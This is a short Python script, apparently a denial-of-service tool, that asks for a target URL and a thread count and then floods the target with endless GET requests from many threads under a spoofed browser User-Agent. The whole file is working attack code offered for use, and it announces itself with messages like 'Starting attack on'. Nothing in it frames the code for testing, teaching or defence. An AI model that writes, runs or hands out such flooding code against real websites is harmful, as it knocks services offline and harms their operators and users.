#!/usr/bin/env python3

import requests
import threading
import sys

def ddos(url, headers):
    while True:
        try:
            response = requests.get(url, headers=headers, timeout=5)
            print(f"Sent GET request to {url}. Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def attack(url, threads):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.3'
    }

    print(f"[*] Starting attack on {url} with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=ddos, args=(url, headers))
        t.daemon = True
        t.start()
        
    # Keep main thread alive to catch KeyboardInterrupt (Ctrl+C)
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    url = input("Enter target URL (e.g., https://example.com): ").strip()
    
    # Ensure URL has protocol
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    try:
        threads = int(input("Enter number of threads: "))
        attack(url, threads)
    except ValueError:
        print("[-] Invalid number of threads. Please enter an integer.")